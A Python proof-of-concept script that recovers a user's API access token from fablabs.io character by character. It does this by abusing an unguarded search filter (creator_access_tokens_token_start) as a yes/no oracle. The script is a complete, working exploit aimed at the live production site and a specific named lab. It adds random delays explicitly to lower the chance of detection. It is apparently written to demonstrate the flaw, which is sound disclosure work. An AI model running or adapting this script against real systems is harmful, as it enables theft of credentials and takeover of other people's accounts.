#!/usr/bin/python3

import random
import time
import requests

"""
Script used to show how we can collect access_token brute-forcing controller.
"""

SETTINGS = {
    # "base_url": "http://www.fablabs.local:3000/labs?q[name_eq]=MyLab1&q[creator_access_tokens_revoked_at_null]=true&q[creator_access_tokens_token_start]=",
    "base_url": "http://www.fablabs.io/labs?q[name_eq]=MIT+Center+for+Bits+and+Atoms-+Closed+to+the+Public&q[creator_access_tokens_revoked_at_null]=true&q[creator_access_tokens_token_start]=",
    "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36"},
    "valid_chars": "0123456789abcdefghijklmnopqrstuvwxyz",
    "success_indicator": lambda response: '<div class="lab media"' in response.content.decode("utf-8")
}

# To reduce server load and detection chance
TIMEOUT_MS = [300, 800]


class StringGenerator:
    def __init__(self, valid_chars):
        self.valid_chars = valid_chars
        self.current_string = ""
        self.current_char_index = 0
        self.go_to_next_char = True

    def next(self):
        if self.go_to_next_char:
            self.current_char_index = 0
            self.go_to_next_char = False
        else:
            self.current_char_index += 1
            self.current_string = self.current_string[:-1]
        self.current_string += self.valid_chars[self.current_char_index]
        return self.current_string

    def success(self):
        self.go_to_next_char = True


def brute(settings):
    start_time = time.time()
    string_generator = StringGenerator(settings["valid_chars"])
    session = requests.session()
    total_requests = 0
    while True:
        try:
            mutation = string_generator.next()
        except:
            print(f"Recovered full value : {settings['base_url'].split('=')[-1] + mutation[:-1]} (seconds elapsed: {int(time.time() - start_time)}, total requests: {total_requests})")
            return
        url = settings["base_url"] + mutation
        print(f"Trying: {url.split('=')[-1]} (seconds elapsed: {int(time.time() - start_time)}, total requests: {total_requests})", end="\r")
        res = session.get(url, headers=settings["headers"])
        assert res.status_code == 200
        success = settings["success_indicator"](res)
        total_requests += 1
        if success:
            string_generator.success()
        time.sleep(random.randint(TIMEOUT_MS[0], TIMEOUT_MS[1]) / 1000)


if __name__ == "__main__":
    print(f"Using base url: {SETTINGS['base_url']}")
    brute(SETTINGS)
